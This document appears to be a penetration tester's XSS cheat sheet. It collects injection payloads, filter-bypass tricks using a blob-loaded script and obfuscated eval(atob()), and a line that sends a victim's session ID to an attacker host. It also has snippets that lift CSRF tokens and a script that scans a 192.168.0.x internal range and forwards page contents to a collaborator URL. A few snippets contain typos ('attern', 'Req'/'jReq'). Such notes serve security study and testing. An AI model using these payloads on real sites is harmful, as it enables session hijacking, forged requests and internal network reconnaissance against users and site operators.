# XSS
## Payloads
```html
<embed src="http://hacker.site/evil.swf">
<embed src="javascript:alert(1)">
<iframe src='jAvAsCripT:alert`1`'></iframe>
```

## Filter Bypass
### Create Blob and use the blob as source
- Create a blob using
	```js
	var b=new Blob(['alert(document.domain)']); var s = document.createElement('script'); s.src = URL.createObjectURL(b); document.head.appendChild(s);
	```

### Base64 into Eval
```html
<img src=x o<scriptnerror=javajavascript:script:eval(atob('%s'))>
```

## Extract Session Data
```js
new Image().src ="http://hacker.site/SID?"+escape(sessionStorage.getItem('sessionID'));
```

> Despite `document.cookie`, the attacker needs to be more precise because the name of the key used to store the session ID may change

## Scripts
### Extract CSRF Token from XSS in same page
Using XHR
```js
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == 4) {
var htmlSource = xhr.responseText;
//some operations…
}
}
xhr.open('GET','http://victim.site/csrf-form-page.html', true);
xhr.send();
```
Using JQuery
```js
Req= jQuery.get('http://victim.site/csrf-form-page.html', 
function() {
var htmlSource = jReq.responseText;
//some operations…
});
```
Using DOM
```js
var token = document.getElementsByName('csrf_token')[0].value
```

### Extract CSRF Token from XSS in different page
Using regex
```js
attern = /csrf_token'\svalue='(.*)'/;
token = htmlSource.match(pattern)[1]
```
Using DOM Parser
```js
parser = new DOMParser().parseFromString(htmlSource,"text/html");
token = parser.getElementsByName('csrf_token')[0];
```

### Internal Network Port Scanner 
```js
<script>
var q = [], collaboratorURL = 'http://ac3b1fe21fddcea0802d5e8a01780096.web-security-academy.net/exploit';
for(i=1;i<=255;i++){
  q.push(
  function(url){
    return function(wait){
    fetchUrl(url,wait);
    }
  }('http://192.168.0.'+i+':8080'));
}
for(i=1;i<=20;i++){
  if(q.length)q.shift()(i*100);
}
function fetchUrl(url, wait){
  var controller = new AbortController(), signal = controller.signal;
  fetch(url, {signal}).then(r=>r.text().then(text=>
    {
    location = collaboratorURL + '?ip='+url.replace(/^http:\/\//,'')+'&code='+encodeURIComponent(text)+'&'+Date.now()
  }
  ))
  .catch(e => {
  if(q.length) {
    q.shift()(wait);
  }
  });
  setTimeout(x=>{
  controller.abort();
  if(q.length) {
    q.shift()(wait);
  }
  }, wait);
}
</script> 
```


## Write-ups
- [Intigriti — XSS Challenge 0621. XSS via WebAssembly | by FHantke | InfoSec Write-ups (infosecwriteups.com)](https://infosecwriteups.com/intigriti-xss-challenge-0621-cf76c28840c1)


## Techniques
- [Blind CSS Exfiltration: exfiltrate unknown web pages | PortSwigger Research](https://portswigger.net/research/blind-css-exfiltration)